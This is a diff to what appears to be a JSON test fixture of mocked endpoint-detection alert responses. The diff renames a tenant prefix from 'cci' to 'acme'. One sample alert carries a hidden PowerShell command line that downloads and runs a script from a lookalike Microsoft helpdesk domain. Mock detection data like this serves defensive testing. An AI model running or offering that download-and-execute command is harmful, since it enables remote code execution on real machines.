@@ -137,7 +137,7 @@
    "path": "^/alerts/queries/alerts/v2$",
    "body": {
     "resources": [
-     "cci:ind:cs-aid-jane01:0001"
+     "acme:ind:cs-aid-jane01:0001"
     ]
    },
    "status": 200,
@@ -150,7 +150,7 @@
    "path": "^/alerts/queries/alerts/v2$",
    "body": {
     "resources": [
-     "cci:ind:cs-aid-jane01:0001"
+     "acme:ind:cs-aid-jane01:0001"
     ]
    },
    "status": 200,
@@ -174,8 +174,8 @@
    "path": "^/alerts/queries/alerts/v2$",
    "body": {
     "resources": [
-     "cci:ind:cs-aid-jane01:0001",
-     "cci:ind:cs-aid-web01:0002"
+     "acme:ind:cs-aid-jane01:0001",
+     "acme:ind:cs-aid-web01:0002"
     ],
     "meta": {
      "pagination": {
@@ -192,7 +192,7 @@
    "body": {
     "resources": [
      {
-      "composite_id": "cci:ind:cs-aid-jane01:0001",
+      "composite_id": "acme:ind:cs-aid-jane01:0001",
       "created_timestamp": "2026-09-20T09:09:12Z",
       "severity": 85,
       "display_name": "PowerShell downloaded and executed a remote payload",
@@ -209,7 +209,7 @@
        "os_version": "Windows 11 Enterprise",
        "platform_name": "Windows"
       },
-      "user_name": "CCI\\jane.doe",
+      "user_name": "ACME\\jane.doe",
       "filename": "invoice_viewer.ps1",
       "sha256": "a3f5c0e1b2d4f6a8c0e2b4d6f8a0c2e4b6d8f0a2c4e6b8d0f2a4c6e8b0d2f4a6",
       "cmdline": "powershell.exe -nop -w hidden -c iex(iwr https://login.micros0ft-helpdesk.com/p.ps1)",
@@ -220,7 +220,7 @@
       "falcon_host_link": "https://falcon.crowdstrike.com/activity-v2/detections/cs-aid-jane01:0001"
      },
      {
-      "composite_id": "cci:ind:cs-aid-web01:0002",
+      "composite_id": "acme:ind:cs-aid-web01:0002",
       "created_timestamp": "2026-09-20T07:40:00Z",
       "severity": 30,
       "display_name": "Unusual outbound connection from web server",
